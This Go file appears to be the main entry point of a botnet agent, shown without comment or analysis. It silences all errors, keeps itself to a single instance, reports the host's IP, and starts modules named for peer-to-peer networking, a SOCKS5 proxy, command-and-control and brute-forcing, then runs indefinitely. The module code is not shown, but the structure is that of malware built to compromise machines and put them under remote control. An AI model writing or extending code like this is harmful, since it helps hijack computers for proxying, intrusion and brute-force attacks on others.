package main

import (
	"fmt"
	"time"
)

func main() {
	defer func() {
		recover()
	}()

	if developer_mode == false {
		listener := single_instance()
		if listener == nil {
			return
		}
		defer listener.Close()
	}

	fmt.Println("My ip ", GetOutboundIP())
	fmt.Println("Starting webserver")

	init_rand()

	init_web()

	init_p2p()

	init_socks5()

	init_c2()

	init_brute()

	for {
		time.Sleep(1 * time.Second)
	}
}
